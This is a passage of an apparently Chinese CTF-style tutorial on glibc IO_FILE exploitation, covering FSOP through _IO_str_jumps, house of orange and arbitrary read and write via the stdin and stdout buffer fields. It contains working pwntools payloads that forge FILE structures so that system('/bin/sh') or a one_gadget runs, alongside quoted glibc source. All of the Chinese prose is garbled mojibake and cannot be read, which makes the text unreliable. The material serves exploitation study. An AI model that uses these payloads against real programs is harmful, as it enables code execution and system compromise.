struct _IO_strfile_ { struct _IO_streambuf _sbf; struct _IO_str_fields _s; } _IO_strfile; å¯ä»¥çœ‹åˆ°ï¼Œå®ƒä½¿ç”¨äº†IOç»“æ„ä½“ä¸­çš„å€¼å½“ä½œå‡½æ•°åœ°å€æ¥ç›´æ¥è°ƒç”¨ï¼Œå¦‚æœæ»¡è¶³æ¡ä»¶ï¼Œå°†ç›´æ¥å°†fp-\u0026gt;_s._free_bufferå½“ä½œå‡½æ•°æŒ‡é’ˆæ¥è°ƒç”¨ã€‚ é¦–å…ˆï¼Œä»ç„¶éœ€è¦ç»•è¿‡ä¹‹å‰çš„_IO_flush_all_lokcpå‡½æ•°ä¸­çš„è¾“å‡ºç¼“å†²åŒºçš„æ£€æŸ¥_mode\u0026lt;=0ä»¥åŠ_IO_write_ptr\u0026gt;_IO_write_baseè¿›å…¥åˆ°_IO_OVERFLOWä¸­ã€‚ æˆ‘ä»¬å¯ä»¥å°†vtableçš„åœ°å€è¦†ç›–æˆ_IO_str_jumps-8ï¼Œè¿™æ ·ä¼šä½¿å¾—_IO_str_finishå‡½æ•°æˆä¸ºäº†ä¼ªé€ çš„vtableåœ°å€çš„_IO_OVERFLOWå‡½æ•°ï¼ˆå› ä¸º_IO_str_finishåç§»ä¸º_IO_str_jumpsä¸­0x10ï¼Œè€Œ_IO_OVERFLOWä¸º0x18ï¼‰ã€‚è¿™ä¸ªvtableï¼ˆåœ°å€ä¸º_IO_str_jumps-8ï¼‰å¯ä»¥ç»•è¿‡æ£€æŸ¥ï¼Œå› ä¸ºå®ƒåœ¨vtableçš„åœ°å€æ®µä¸­ã€‚ æ„é€ å¥½vtableä¹‹åï¼Œéœ€è¦åšçš„å°±æ˜¯æ„é€ IO FILEç»“æ„ä½“å…¶ä»–å­—æ®µï¼Œä»¥è¿›å…¥å°†fp-\u0026gt;_s._free_bufferå½“ä½œå‡½æ•°æŒ‡é’ˆçš„è°ƒç”¨ï¼šå…ˆæ„é€ fp-\u0026gt;_IO_buf_baseä¸º/bin/shçš„åœ°å€ï¼Œç„¶åæ„é€ fp-\u0026gt;_flagsä¸åŒ…å«_IO_USER_BUFï¼Œå®ƒçš„å®šä¹‰ä¸º#define _IO_USER_BUF 1ï¼Œå³fp-\u0026gt;_flagsæœ€ä½ä½ä¸º0ã€‚ æœ€åæ„é€ fp-\u0026gt;_s._free_bufferä¸ºsystem_addræˆ–one gadgetå³å¯getshellã€‚ ç”±äºlibcä¸­æ²¡æœ‰_IO_str_jumpçš„ç¬¦å·ï¼Œå› æ­¤å¯ä»¥é€šè¿‡_IO_str_jumpsæ˜¯vtableä¸­çš„å€’æ•°ç¬¬äºŒä¸ªè¡¨ï¼Œç”¨vtableçš„æœ€ååœ°å€å‡å»0x168å®šä½ã€‚ ä¹Ÿå¯ä»¥ç”¨å¦‚ä¸‹å‡½æ•°è¿›è¡Œå®šä½ï¼š\n1 2 3 4 5 6 7 8 # libc.address = libc_base def get_IO_str_jumps(): IO_file_jumps_addr = libc.sym[\u0026#39;_IO_file_jumps\u0026#39;] IO_str_underflow_addr = libc.sym[\u0026#39;_IO_str_underflow\u0026#39;] for ref in libc.search(p64(IO_str_underflow_addr-libc.address)): possible_IO_str_jumps_addr = ref - 0x20 if possible_IO_str_jumps_addr \u0026gt; IO_file_jumps_addr: return possible_IO_str_jumps_addr å¯ä»¥è¿›è¡Œå¦‚ä¸‹æ„é€ ï¼š\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 ._chain =\u0026gt; chunk_addr chunk_addr { file = { _flags = 0x0, _IO_read_ptr = 0x0, _IO_read_end = 0x0, _IO_read_base = 0x0, _IO_write_base = 0x0, _IO_write_ptr = 0x1, _IO_write_end = 0x0, _IO_buf_base = bin_sh_addr, ... _mode = 0x0, //ä¸€èˆ¬ä¸ç”¨ç‰¹æ„è®¾ç½® _unused2 = \u0026#39;\\000\u0026#39; \u0026lt;repeats 19 times\u0026gt; }, vtable = _IO_str_jumps-8 //chunk_addr + 0xd8 ~ +0xe0 } +0xe0 ~ +0xe8 : 0x0 +0xe8 ~ +0xf0 : system_addr / one_gadget //fp-\u0026gt;_s._free_buffer åˆ©ç”¨house of orangeæ„é€ çš„payloadï¼š\n1 2 3 4 payload = p64(0) + p64(0x60) + p64(0) + p64(libc.sym[\u0026#39;_IO_list_all\u0026#39;] - 0x10) #unsorted bin attack payload += p64(0) + p64(1) + p64(0) + p64(next(libc.search(b\u0026#39;/bin/sh\u0026#39;))) payload = payload.ljust(0xd8, b\u0026#39;\\x00\u0026#39;) + p64(get_IO_str_jumps() - 8) payload += p64(0) + p64(libc.sym[\u0026#39;system\u0026#39;]) å†æ¥ä»‹ç»ä¸€ä¸‹ï¼šåˆ©ç”¨_IO_str_jumpsä¸­_IO_str_overflow()å‡½æ•°çš„æ‰‹æ®µã€‚ _IO_str_overflow()å‡½æ•°çš„æºç å¦‚ä¸‹ï¼š\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 int _IO_str_overflow (_IO_FILE *fp, int c) { int flush_only = c == EOF; _IO_size_t pos; if (fp-\u0026gt;_flags \u0026amp; _IO_NO_WRITES) return flush_only ? 0 : EOF; if ((fp-\u0026gt;_flags \u0026amp; _IO_TIED_PUT_GET) \u0026amp;\u0026amp; !(fp-\u0026gt;_flags \u0026amp; _IO_CURRENTLY_PUTTING)) { fp-\u0026gt;_flags |= _IO_CURRENTLY_PUTTING; fp-\u0026gt;_IO_write_ptr = fp-\u0026gt;_IO_read_ptr; fp-\u0026gt;_IO_read_ptr = fp-\u0026gt;_IO_read_end; } pos = fp-\u0026gt;_IO_write_ptr - fp-\u0026gt;_IO_write_base; if (pos \u0026gt;= (_IO_size_t) (_IO_blen (fp) + flush_only)) { if (fp-\u0026gt;_flags \u0026amp; _IO_USER_BUF) /* not allowed to enlarge */ return EOF; else { char *new_buf; char *old_buf = fp-\u0026gt;_IO_buf_base; size_t old_blen = _IO_blen (fp); _IO_size_t new_size = 2 * old_blen + 100; if (new_size \u0026lt; old_blen) return EOF; new_buf = (char *) (*((_IO_strfile *) fp)-\u0026gt;_s._allocate_buffer) (new_size); // è°ƒç”¨äº†fp-\u0026gt;_s._allocate_bufferå‡½æ•°æŒ‡é’ˆ if (new_buf == NULL) { /* __ferror(fp) = 1; */ return EOF; } if (old_buf) { memcpy (new_buf, old_buf, old_blen); (*((_IO_strfile *) fp)-\u0026gt;_s._free_buffer) (old_buf); /* Make sure _IO_setb won\u0026#39;t try to delete _IO_buf_base. */ fp-\u0026gt;_IO_buf_base = NULL; } memset (new_buf + old_blen, \u0026#39;\\0\u0026#39;, new_size - old_blen); _IO_setb (fp, new_buf, new_buf + new_size, 1); fp-\u0026gt;_IO_read_base = new_buf + (fp-\u0026gt;_IO_read_base - old_buf); fp-\u0026gt;_IO_read_ptr = new_buf + (fp-\u0026gt;_IO_read_ptr - old_buf); fp-\u0026gt;_IO_read_end = new_buf + (fp-\u0026gt;_IO_read_end - old_buf); fp-\u0026gt;_IO_write_ptr = new_buf + (fp-\u0026gt;_IO_write_ptr - old_buf); fp-\u0026gt;_IO_write_base = new_buf; fp-\u0026gt;_IO_write_end = fp-\u0026gt;_IO_buf_end; } } if (!flush_only) *fp-\u0026gt;_IO_write_ptr++ = (unsigned char) c; if (fp-\u0026gt;_IO_write_ptr \u0026gt; fp-\u0026gt;_IO_read_end) fp-\u0026gt;_IO_read_end = fp-\u0026gt;_IO_write_ptr; return c; } å’Œä¹‹å‰åˆ©ç”¨_IO_str_finishçš„æ€è·¯å·®ä¸å¤šï¼Œå¯ä»¥çœ‹åˆ°å…¶ä¸­è°ƒç”¨äº†fp-\u0026gt;_s._allocate_bufferå‡½æ•°æŒ‡é’ˆï¼Œå…¶å‚æ•°rdiä¸ºnew_sizeï¼Œå› æ­¤ï¼Œæˆ‘ä»¬å°†_s._allocate_bufferæ”¹ä¸ºsystemçš„åœ°å€ï¼Œnew_sizeæ”¹ä¸º/bin/shçš„åœ°å€ï¼Œåˆnew_size = 2 * old_blen + 100ï¼Œä¹Ÿå°±æ˜¯new_size = 2 * _IO_blen (fp) + 100ï¼Œå¯ä»¥æ‰¾åˆ°å®å®šä¹‰ï¼š#define _IO_blen(fp) ((fp)-\u0026gt;_IO_buf_end - (fp)-\u0026gt;_IO_buf_base)ï¼Œå› æ­¤new_size = 2 * ((fp)-\u0026gt;_IO_buf_end - (fp)-\u0026gt;_IO_buf_base) + 100ï¼Œæ•…æˆ‘ä»¬å¯ä»¥ä½¿_IO_buf_base = 0ï¼Œ_IO_buf_end = (bin_sh_addr - 100) // 2ï¼Œå½“ç„¶è¿˜ä¸èƒ½å¿˜äº†éœ€è¦ç»•è¿‡_IO_flush_all_lokcpå‡½æ•°ä¸­çš„è¾“å‡ºç¼“å†²åŒºçš„æ£€æŸ¥_mode\u0026lt;=0ä»¥åŠ_IO_write_ptr\u0026gt;_IO_write_baseæ‰èƒ½è¿›å…¥åˆ°_IO_OVERFLOWä¸­ï¼Œæ•…ä»¤_IO_write_ptr = 0xffffffffffffffffä¸”_IO_write_base = 0x0å³å¯ã€‚ æœ€ç»ˆå¯æŒ‰å¦‚ä¸‹å¸ƒå±€fake IO_FILEï¼š\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 ._chain =\u0026gt; chunk_addr chunk_addr { file = { _flags = 0x0, _IO_read_ptr = 0x0, _IO_read_end = 0x0, _IO_read_base = 0x0, _IO_write_base = 0x0, _IO_write_ptr = 0x1, _IO_write_end = 0x0, _IO_buf_base = 0x0, _IO_buf_end = (bin_sh_addr - 100) // 2, ... _mode = 0x0, //ä¸€èˆ¬ä¸ç”¨ç‰¹æ„è®¾ç½® _unused2 = \u0026#39;\\000\u0026#39; \u0026lt;repeats 19 times\u0026gt; }, vtable = _IO_str_jumps //chunk_addr + 0xd8 ~ +0xe0 } +0xe0 ~ +0xe8 : system_addr / one_gadget //fp-\u0026gt;_s._allocate_buffer å‚è€ƒpayloadï¼ˆåŠ«æŒçš„stdoutï¼‰ï¼š\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 new_size = libc_base + next(libc.search(b\u0026#39;/bin/sh\u0026#39;)) payload = p64(0xfbad2084) payload += p64(0) # _IO_read_ptr payload += p64(0) # _IO_read_end payload += p64(0) # _IO_read_base payload += p64(0) # _IO_write_base payload += p64(0xffffffffffffffff) # _IO_write_ptr payload += p64(0) # _IO_write_end payload += p64(0) # _IO_buf_base payload += p64((new_size - 100) // 2) # _IO_buf_end payload += p64(0) * 4 payload += p64(libc_base + libc.sym[\u0026#34;_IO_2_1_stdin_\u0026#34;]) payload += p64(1) + p64((1\u0026lt;\u0026lt;64) - 1) payload += p64(0) + p64(libc_base + 0x3ed8c0) #lock payload += p64((1\u0026lt;\u0026lt;64) - 1) + p64(0) payload += p64(libc_base + 0x3eb8c0) payload += p64(0) * 6 payload += p64(libc_base + get_IO_str_jumps_offset()) # _IO_str_jumps payload += p64(libc_base + libc.sym[\u0026#34;system\u0026#34;]) è€Œåœ¨libc-2.28åŠä»¥åï¼Œç”±äºä¸å†ä½¿ç”¨åç§»æ‰¾_s._allocate_bufferå’Œ_s._free_bufferï¼Œè€Œæ˜¯ç›´æ¥ç”¨mallocå’Œfreeä»£æ›¿ï¼Œæ‰€ä»¥FSOPä¹Ÿå¤±æ•ˆäº†ã€‚\nhouse of orange åˆ©ç”¨unsorted bin attack é…åˆ IO_FILE attack (FSOP)è¿›è¡Œæ”»å‡»ã€‚ é€šè¿‡unsorted bin attackå°†_IO_list_allå†…å®¹ä»_IO_2_1_stderr_æ”¹ä¸ºmain_arena+88/96ï¼ˆå®åˆ™æŒ‡å‘top chunkï¼‰ã€‚ è€Œåœ¨_IO_FILE_plusç»“æ„ä½“ä¸­ï¼Œ_chainçš„åç§»ä¸º0x68ï¼Œè€Œtop chunkä¹‹åä¸º0x8å•ä½çš„last_remainderï¼Œæ¥ä¸‹æ¥ä¸ºunsorted binçš„fdä¸bkæŒ‡é’ˆï¼Œå…±0x10å¤§å°ï¼Œå†ä¹‹åä¸ºsmall binä¸­çš„æŒ‡é’ˆï¼ˆæ¯ä¸ªsmall binæœ‰fdä¸bkæŒ‡é’ˆï¼Œå…±0x10ä¸ªå•ä½ï¼‰ï¼Œå‰©ä¸‹0x50çš„å•ä½ï¼Œä»smallbin[0]æ­£å¥½åˆ†é…åˆ°smallbin[4]ï¼ˆå‡†ç¡®è¯´ä¸ºå…¶fdå­—æ®µï¼‰ï¼Œå¤§å°å°±æ˜¯ä»0x20åˆ°0x60ï¼Œè€Œsmallbin[4]çš„fdå­—æ®µä¸­çš„å†…å®¹ä¸ºè¯¥é“¾è¡¨ä¸­æœ€é è¿‘è¡¨å¤´çš„small binçš„åœ°å€ (chunk header)ï¼Œå› æ­¤0x60çš„small binçš„åœ°å€å³ä¸ºfake structçš„_chainä¸­çš„å†…å®¹ï¼Œåªéœ€è¦æ§åˆ¶è¯¥0x60çš„small binï¼ˆä»¥åŠå…¶ä¸‹é¢æŸäº›å †å—ï¼‰ä¸­çš„éƒ¨åˆ†å†…å®¹ï¼Œå³å¯è¿›è¡ŒFSOPã€‚\nIO_FILE attack ä¹‹ åˆ©ç”¨_filenoå­—æ®µ _filenoçš„å€¼å°±æ˜¯æ–‡ä»¶æè¿°ç¬¦ï¼Œä½äºstdinæ–‡ä»¶ç»“æ„å¼€å¤´0x70åç§»å¤„ï¼Œå¦‚ï¼šstdinçš„filenoä¸º0ï¼Œstdoutçš„filenoä¸º1ï¼Œstderrçš„filenoä¸º2ã€‚ åœ¨æ¼æ´åˆ©ç”¨ä¸­ï¼Œå¯ä»¥é€šè¿‡ä¿®æ”¹stdinçš„_filenoå€¼æ¥é‡å®šä½éœ€è¦è¯»å–çš„æ–‡ä»¶ï¼Œæœ¬æ¥ä¸º0çš„è¯ï¼Œè¡¨ç¤ºä»æ ‡å‡†è¾“å…¥ä¸­è¯»å–ï¼Œä¿®æ”¹ä¸º3åˆ™è¡¨ç¤ºä¸ºä»æ–‡ä»¶æè¿°ç¬¦ä¸º3çš„æ–‡ä»¶ï¼ˆå·²ç»opençš„æ–‡ä»¶ï¼‰ä¸­è¯»å–ï¼Œè¯¥åˆ©ç”¨åœ¨æŸäº›æƒ…å†µä¸‹å¯ç›´æ¥è¯»å–flagã€‚\nIO_FILE attack ä¹‹ ä»»æ„è¯»å†™ 1.åˆ©ç”¨stdinè¿›è¡Œä»»æ„å†™\nscanfï¼Œfreadï¼Œgetsç­‰è¯»å…¥èµ°IOæŒ‡é’ˆï¼ˆreadä¸èµ°ï¼‰ã€‚ å¤§ä½“æµç¨‹ä¸ºï¼šè‹¥_IO_buf_baseä¸ºç©ºï¼Œåˆ™è°ƒç”¨_IO_doallocbufå»åˆå§‹åŒ–è¾“å…¥ç¼“å†²åŒºï¼Œç„¶ååˆ¤æ–­è¾“å…¥ç¼“å†²åŒºæ˜¯å¦å­˜åœ¨å‰©ä½™æ•°æ®ï¼Œå¦‚æœè¾“å…¥ç¼“å†²åŒºæœ‰å‰©ä½™æ•°æ®ï¼ˆ_IO_read_end \u0026gt; _IO_read_ptrï¼‰åˆ™å°†å…¶ç›´æ¥æ‹·è´è‡³ç›®æ ‡åœ°å€ï¼ˆä¸ä¼šå¯¹æ­¤æ—¶è¾“å…¥çš„æ•°æ®è¿›è¡Œè¯»å…¥ï¼‰ï¼Œå¦‚æœæ²¡æœ‰æˆ–ä¸å¤Ÿï¼Œåˆ™è°ƒç”¨__underflowå‡½æ•°æ‰§è¡Œç³»ç»Ÿè°ƒç”¨è¯»å–æ•°æ®ï¼ˆSYS_readï¼‰åˆ°è¾“å…¥ç¼“å†²åŒºï¼ˆä»_IO_buf_baseåˆ°_IO_buf_endï¼Œé»˜è®¤0x400ï¼Œå³å°†æ•°æ®è¯»åˆ°_IO_buf_baseï¼Œè¯»å–0x400ä¸ªå­—èŠ‚ï¼‰ï¼Œæ­¤æ—¶è‹¥å®é™…è¯»å…¥äº†nä¸ªå­—èŠ‚çš„æ•°æ®ï¼Œåˆ™_IO_read_end = _IO_buf_base + nï¼ˆå³_IO_read_endæŒ‡å‘å®é™…è¯»å…¥çš„æœ€åä¸€ä¸ªå­—èŠ‚çš„æ•°æ®ï¼‰ï¼Œä¹‹åå†å°†è¾“å…¥ç¼“å†²åŒºä¸­çš„æ•°æ®æ‹·è´åˆ°ç›®æ ‡åœ°å€ã€‚ è¿™é‡Œéœ€è¦æ³¨æ„çš„æ˜¯ï¼Œè‹¥è¾“å…¥ç¼“å†²åŒºä¸­æ²¡æœ‰å‰©ä½™çš„æ•°æ®ï¼Œåˆ™æ¯æ¬¡è¯»å…¥æ•°æ®è¿›è¾“å…¥ç¼“å†²åŒºï¼Œä»…å’Œ_IO_buf_baseä¸_IO_buf_endæœ‰å…³ã€‚ åœ¨å°†æ•°æ®ä»è¾“å…¥ç¼“å†²åŒºæ‹·è´åˆ°ç›®æ ‡åœ°å€çš„è¿‡ç¨‹ä¸­ï¼Œéœ€è¦æ»¡è¶³æ‰€è°ƒç”¨çš„è¯»å…¥å‡½æ•°çš„è‡ªèº«çš„é™åˆ¶æ¡ä»¶ï¼Œä¾‹å¦‚ï¼šä½¿ç”¨scanf(\u0026quot;%d\u0026quot;,\u0026amp;a)è¯»å…¥æ•´æ•°ï¼Œåˆ™å½“åœ¨è¾“å…¥ç¼“å†²åŒºä¸­é‡åˆ°äº†å­—ç¬¦ï¼ˆæˆ–scanfçš„ä¸€äº›æˆªæ–­ç¬¦ï¼‰ç­‰ä¸ç¬¦åˆçš„æƒ…å†µï¼Œå°±ä¼šåœæ­¢è¿™ä¸ªæ‹·è´çš„è¿‡ç¨‹ã€‚æœ€ç»ˆï¼Œ_IO_read_ptræŒ‡å‘æˆåŠŸæ‹·è´åˆ°ç›®çš„åœ°å€ä¸­çš„æœ€åä¸€ä¸ªå­—èŠ‚æ•°æ®åœ¨è¾“å…¥ç¼“å†²åŒºä¸­çš„åœ°å€ã€‚å› æ­¤ï¼Œè‹¥æ˜¯é‡åˆ°äº†ä¸ç¬¦åˆé™åˆ¶æ¡ä»¶çš„æƒ…å†µè€Œç»ˆæ­¢æ‹·è´ï¼Œåˆ™æœ€ç»ˆä¼šä½¿å¾—_IO_read_end \u0026gt; _IO_read_ptrï¼Œå³å†ä¸‹ä¸€æ¬¡è¯»å…¥ä¹‹å‰ä¼šè¢«è®¤å®šä¸ºè¾“å…¥ç¼“å†²åŒºä¸­ä»æœ‰å‰©ä½™æ•°æ®ï¼Œåœ¨æ­¤æƒ…å†µä¸‹ï¼Œå¾ˆæœ‰å¯èƒ½ä¸ä¼šè¿›è¡Œæ­¤æ¬¡è¯»å…¥ï¼Œæˆ–å°†è¾“å…¥ç¼“å†²åŒºä¸­å‰©ä½™çš„æ•°æ®æ‹·è´åˆ°æ­¤æ¬¡è¯»å…¥çš„ç›®æ ‡åœ°å€ï¼Œä»è€Œå¯¼è‡´è¯»å…¥çš„é”™è¯¯ã€‚ getchar()å’ŒIO_getc()çš„ä½œç”¨æ˜¯åˆ·æ–°_IO_read_ptrï¼Œæ¯æ¬¡è°ƒç”¨ï¼Œä¼šä»è¾“å…¥ç¼“å†²åŒºè¯»ä¸€ä¸ªå­—èŠ‚æ•°æ®ï¼Œå³å°†_IO_read_ptr++ã€‚\nç›¸å…³æºç ï¼š\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 _IO_size_t _IO_file_xsgetn (_IO_FILE *fp, void *data, _IO_size_t n) { ... if (fp-\u0026gt;_IO_buf_base == NULL) { ... //è¾“å…¥ç¼“å†²åŒºä¸ºç©ºåˆ™åˆå§‹åŒ–è¾“å…¥ç¼“å†²åŒº } while (want \u0026gt; 0) { have = fp-\u0026gt;_IO_read_end - fp-\u0026gt;_IO_read_ptr; if (have \u0026gt; 0) { ... //memcpy } if (fp-\u0026gt;_IO_buf_base \u0026amp;\u0026amp; want \u0026lt; (size_t) (fp-\u0026gt;_IO_buf_end - fp-\u0026gt;_IO_buf_base)) { if (__underflow (fp) == EOF) // è°ƒç”¨__underflowè¯»å…¥æ•°æ® ... } ... return n - want; } 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 int _IO_new_file_underflow (_IO_FILE *fp) { _IO_ssize_t count; ... // ä¼šæ£€æŸ¥_flagsæ˜¯å¦åŒ…å«_IO_NO_READSæ ‡å¿—ï¼ŒåŒ…å«åˆ™ç›´æ¥è¿”å›ã€‚ // æ ‡å¿—çš„å®šä¹‰æ˜¯#define _IO_NO_READS 4ï¼Œå› æ­¤_flagsä¸èƒ½åŒ…å«4ã€‚ if (fp-\u0026gt;_flags \u0026amp; _IO_NO_READS) { fp-\u0026gt;_flags |= _IO_ERR_SEEN; __set_errno (EBADF); return EOF; } // å¦‚æœè¾“å…¥ç¼“å†²åŒºé‡Œå­˜åœ¨æ•°æ®ï¼Œåˆ™ç›´æ¥è¿”å› if (fp-\u0026gt;_IO_read_ptr \u0026lt; fp-\u0026gt;_IO_read_end) return *(unsigned char *) fp-\u0026gt;_IO_read_ptr; ... // è°ƒç”¨_IO_SYSREADå‡½æ•°æœ€ç»ˆæ‰§è¡Œç³»ç»Ÿè°ƒç”¨è¯»å–æ•°æ® count = _IO_SYSREAD (fp, fp-\u0026gt;_IO_buf_base, fp-\u0026gt;_IO_buf_end - fp-\u0026gt;_IO_buf_base); ... } libc_hidden_ver (_IO_new_file_underflow, _IO_file_underflow) ç»¼ä¸Šï¼Œä¸ºäº†åšåˆ°ä»»æ„å†™ï¼Œæ»¡è¶³å¦‚ä¸‹æ¡ä»¶ï¼Œå³å¯è¿›è¡Œåˆ©ç”¨ï¼š (1) è®¾ç½®_IO_read_endç­‰äº_IO_read_ptrï¼ˆä½¿å¾—è¾“å…¥ç¼“å†²åŒºå†…æ²¡æœ‰å‰©ä½™æ•°æ®ï¼Œä»è€Œå¯ä»¥ä»ç”¨æˆ·è¯»å…¥æ•°æ®ï¼‰ã€‚ (2) è®¾ç½®_flag \u0026amp;~ _IO_NO_READSå³_flag \u0026amp;~ 0x4ï¼ˆä¸€èˆ¬ä¸ç”¨ç‰¹æ„è®¾ç½®ï¼‰ã€‚ (3) è®¾ç½®_filenoä¸º0ï¼ˆä¸€èˆ¬ä¸ç”¨ç‰¹æ„è®¾ç½®ï¼‰ã€‚ (4) è®¾ç½®_IO_buf_baseä¸ºwrite_startï¼Œ_IO_buf_endä¸ºwrite_endï¼ˆæˆ‘ä»¬ç›®æ ‡å†™çš„èµ·å§‹åœ°å€æ˜¯write_startï¼Œå†™ç»“æŸåœ°å€ä¸ºwrite_endï¼‰ï¼Œä¸”ä½¿å¾—_IO_buf_end-_IO_buf_baseå¤§äºè¦å†™å…¥çš„æ•°æ®é•¿åº¦ã€‚\n2.åˆ©ç”¨stdoutè¿›è¡Œä»»æ„è¯»/å†™\nprintfï¼Œfwriteï¼Œputsç­‰è¾“å‡ºèµ°IOæŒ‡é’ˆï¼ˆwriteä¸èµ°ï¼‰ã€‚ åœ¨_IO_2_1_stdout_ä¸­ï¼Œ_IO_buf_baseå’Œ_IO_buf_endä¸ºè¾“å‡ºç¼“å†²åŒºèµ·å§‹ä½ç½®ï¼ˆé»˜è®¤å¤§å°ä¸º0x400ï¼‰ï¼Œåœ¨è¾“å‡ºçš„è¿‡ç¨‹ä¸­ï¼Œä¼šå…ˆå°†éœ€è¦è¾“å‡ºçš„æ•°æ®ä»ç›®æ ‡åœ°å€æ‹·è´åˆ°è¾“å‡ºç¼“å†²åŒºï¼Œå†ä»è¾“å‡ºç¼“å†²åŒºè¾“å‡ºç»™ç”¨æˆ·ã€‚ ç¼“å†²åŒºå»ºç«‹å‡½æ•°_IO_doallocbufä¼šå»ºç«‹è¾“å‡ºç¼“å†²åŒºï¼Œå¹¶æŠŠåŸºåœ°å€ä¿å­˜åœ¨_IO_buf_baseä¸­ï¼Œç»“æŸåœ°å€ä¿å­˜åœ¨_IO_buf_endä¸­ã€‚åœ¨å»ºç«‹é‡Œè¾“å‡ºç¼“å†²åŒºåï¼Œä¼šå°†åŸºå€å€ç»™_IO_write_baseï¼Œè‹¥æ˜¯è®¾ç½®çš„æ˜¯å…¨ç¼“å†²æ¨¡å¼_IO_FULL_BUFï¼Œåˆ™ä¼šå°†ç»“æŸåœ°å€ç»™_IO_write_endï¼Œè‹¥æ˜¯è®¾ç½®çš„æ˜¯è¡Œç¼“å†²æ¨¡å¼_IO_LINE_BUFï¼Œåˆ™_IO_write_endä¸­å­˜çš„æ˜¯_IO_buf_baseï¼Œæ­¤å¤–ï¼Œ_IO_write_ptrè¡¨ç¤ºè¾“å‡ºç¼“å†²åŒºä¸­å·²ç»ä½¿ç”¨åˆ°çš„åœ°å€ã€‚å³_IO_write_baseåˆ°_IO_write_pträ¹‹é—´çš„ç©ºé—´æ˜¯å·²ç»ä½¿ç”¨çš„ç¼“å†²åŒºï¼Œ_IO_write_ptråˆ°_IO_write_endä¹‹é—´ä¸ºå‰©ä½™çš„è¾“å‡ºç¼“å†²åŒºã€‚ æœ€ç»ˆå®é™…è°ƒç”¨äº†_IO_2_1_stdout_çš„vtableä¸­çš„_xsputnï¼Œä¹Ÿå°±æ˜¯_IO_new_file_xsputnå‡½æ•°ï¼Œæºç å¦‚ä¸‹ï¼š\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 IO_size_t _IO_new_file_xsputn (_IO_FILE *f, const void *data, _IO_size_t n) { const char *s = (const char *) data; _IO_size_t to_do = n; int must_flush = 0; _IO_size_t count = 0; if (n \u0026lt;= 0) return 0; if ((f-\u0026gt;_flags \u0026amp; _IO_LINE_BUF) \u0026amp;\u0026amp; (f-\u0026gt;_flags \u0026amp; _IO_CURRENTLY_PUTTING)) { //å¦‚æœæ˜¯è¡Œç¼“å†²æ¨¡å¼... count = f-\u0026gt;_IO_buf_end - f-\u0026gt;_IO_write_ptr; //åˆ¤æ–­è¾“å‡ºç¼“å†²åŒºè¿˜æœ‰å¤šå°‘ç©ºé—´ if (count \u0026gt;= n) { const char *p; for (p = s + n; p \u0026gt; s; ) { if (*--p == \u0026#39;\\n\u0026#39;) //æœ€åä¸€ä¸ªæ¢è¡Œç¬¦\\nä¸ºæˆªæ–­ç¬¦ï¼Œä¸”éœ€è¦åˆ·æ–°è¾“å‡ºç¼“å†²åŒº { count = p - s + 1; must_flush = 1; //æ ‡å¿—ä¸ºçœŸï¼šéœ€è¦åˆ·æ–°è¾“å‡ºç¼“å†²åŒº break; } } } } else if (f-\u0026gt;_IO_write_end \u0026gt; f-\u0026gt;_IO_write_ptr) //åˆ¤æ–­è¾“å‡ºç¼“å†²åŒºè¿˜æœ‰å¤šå°‘ç©ºé—´ï¼ˆå…¨ç¼“å†²æ¨¡å¼ï¼‰ count = f-\u0026gt;_IO_write_end - f-\u0026gt;_IO_write_ptr; if (count \u0026gt; 0) { //å¦‚æœè¾“å‡ºç¼“å†²åŒºæœ‰ç©ºé—´ï¼Œåˆ™å…ˆæŠŠæ•°æ®æ‹·è´è‡³è¾“å‡ºç¼“å†²åŒº if (count \u0026gt; to_do) count = to_do; f-\u0026gt;_IO_write_ptr = __mempcpy (f-\u0026gt;_IO_write_ptr, s, count); s += count; to_do -= count; } if (to_do + must_flush \u0026gt; 0) //æ­¤å¤„å…³é”®ï¼Œè§ä¸‹æ–‡è¯¦ç»†è®¨è®º { _IO_size_t block_size, do_write; if (_IO_OVERFLOW (f, EOF) == EOF) //è°ƒç”¨_IO_OVERFLOW return to_do == 0 ? EOF : n - to_do; block_size = f-\u0026gt;_IO_buf_end - f-\u0026gt;_IO_buf_base; do_write = to_do - (block_size \u0026gt;= 128 ? to_do % block_size : 0); if (do_write) { count = new_do_write (f, s, do_write); to_do -= count; if (count \u0026lt; do_write) return n - to_do; } if (to_do) to_do -= _IO_default_xsputn (f, s+do_write, to_do); } return n - to_do; } libc_hidden_ver (_IO_new_file_xsputn, _IO_file_xsputn) ï¼ˆ1ï¼‰ä»»æ„å†™ å¯ä»¥çœ‹åˆ°ï¼Œåœ¨è¡Œç¼“å†²æ¨¡å¼ä¸‹ï¼Œåˆ¤æ–­è¾“å‡ºç¼“å†²åŒºè¿˜æœ‰å¤šå°‘ç©ºé—´ï¼Œç”¨çš„æ˜¯count = f-\u0026gt;_IO_buf_end - f-\u0026gt;_IO_write_ptrï¼Œè€Œåœ¨å…¨ç¼“å†²æ¨¡å¼ä¸‹ï¼Œç”¨çš„æ˜¯count = f-\u0026gt;_IO_write_end - f-\u0026gt;_IO_write_ptrï¼Œè‹¥æ˜¯è¿˜æœ‰ç©ºé—´å‰©ä½™ï¼Œåˆ™ä¼šå°†è¦è¾“å‡ºçš„æ•°æ®å¤åˆ¶åˆ°è¾“å‡ºç¼“å†²åŒºä¸­ï¼ˆæ­¤æ—¶ç”±_IO_write_ptræ§åˆ¶ï¼Œå‘_IO_write_ptræ‹·è´counté•¿åº¦çš„æ•°æ®ï¼‰ï¼Œå› æ­¤å¯é€šè¿‡è¿™ä¸€ç‚¹æ¥å®ç°ä»»æ„åœ°å€å†™çš„åŠŸèƒ½ã€‚ 